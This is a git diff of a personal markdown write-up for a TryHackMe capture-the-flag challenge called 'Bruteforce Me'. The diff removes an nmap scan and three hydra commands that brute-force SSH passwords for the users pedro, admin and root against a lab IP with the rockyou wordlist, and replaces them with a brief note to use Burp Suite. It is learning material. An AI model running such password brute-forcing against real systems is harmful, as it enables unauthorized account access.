@@ -13,26 +13,14 @@ I did not think about doing a write-up to keep track of my learning progress bef
 
 I will be using the AttackBox built in to THM.
 
-## :two: 2. (Easy) Bruteforce Me
+## :two: 2. Web Exploitation(Easy) Bruteforce Me
 
 ### Level Hint: I forgot my credentials yet again... Can you guess them for me? I think my user was either pedro, admin or root.
 
 ### Solution:
-Going to run an nmap scan. 
-```
-nmap -sV 10.10.0.186
-```
-looking for open ports, specifically 22 (SSH), 80 (HTTP)
+Brute force web page.
+use burp suite
 
-Port 22 is open
 
-  Going to try to use the rockyou.txt which is found in most kali linux machines. `usr/share/wordlists/rockyou.txt`
-
-  Going to try to test each username individually using hydra.
-```
-hydra -l pedro -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
-```
 
 ### Notes:
